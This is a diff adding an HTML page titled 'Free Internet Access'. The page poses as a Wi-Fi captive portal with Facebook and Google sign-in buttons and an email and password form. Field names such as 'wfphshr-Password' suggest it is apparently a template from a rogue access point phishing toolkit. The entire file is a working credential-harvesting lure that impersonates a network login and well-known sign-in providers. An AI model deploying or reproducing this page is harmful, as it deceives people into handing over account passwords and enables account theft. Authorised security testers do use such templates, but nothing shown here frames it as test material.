@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Free Internet Access</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="bootstrap.min.css">
+  <link href="bootstrap-social.css" rel="stylesheet">
+  <link href="font-awesome.css" rel="stylesheet">
+  <script src="jquery.min.js"></script>
+  <script src="bootstrap.min.js"></script>
+  <!-- CSS -->
+  <style type="text/css">
+    body {
+          padding-top: 40px;
+          padding-bottom: 40px;
+          background-color: #eee;
+          }
+
+          .form-signin {
+            max-width: 330px;
+            padding: 15px;
+            margin: 0 auto;
+          }
+          .form-signin .form-signin-heading,
+          .form-signin .checkbox {
+            margin-bottom: 10px;
+          }
+
+          .form-signin .form-control {
+            position: relative;
+            height: auto;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            padding: 10px;
+            font-size: 16px;
+          }
+          .form-signin .form-control:focus {
+            z-index: 2;
+          }
+          .form-signin input[type="email"] {
+            margin-bottom: 1em;
+            border-bottom-right-radius: 0;
+            border-bottom-left-radius: 0;
+          }
+          .form-signin input[type="password"] {
+            margin-bottom: 2em;
+            border-top-left-radius: 0;
+            border-top-right-radius: 0;
+          }
+  </style>
+</head>
+<body>
+  <div class="container .text-center social-buttons">
+    <p class="lead">In order to connect to internet please sign in below.</p>
+  <div class="container">
+      <form class="form-signin" action="upgrading.html" method="POST" name="LoginForm">
+        <div data-toggle="buttons">
+          <label class="btn btn-block btn-facebook" style="margin-bottom:1em;">
+            <input type="radio" name="options" id="facebook">
+              <span class="fa fa-facebook" style="padding-right:2em"></span>Sign in with Facebook
+          </label>
+          <label class="btn btn-block btn-google" style="margin-bottom:1em;">
+            <input type="radio" name="options" id="google">
+              <span class="fa fa-google" style="padding-right:2em"></span>
+              <span style="padding-right:1em">Sign in with Google</span>
+          </label>
+        </div>
+        <label for="inputEmail" class="sr-only">Email address</label>
+        <input type="email" id="inputEmail" class="form-control"
+          name="wfphshr-Username" placeholder="Email address" required autofocus>
+        <label for="inputPassword" class="sr-only">Password</label>
+        <input type="password" id="inputPassword" class="form-control"
+          name="wfphshr-Password" placeholder="Password" required>
+        <button class="btn btn-lg btn-primary btn-block" type="submit"
+          id="btn">Sign in</button>
+      </form>
+    </div> <!-- /container -->
+</body>
+</html>
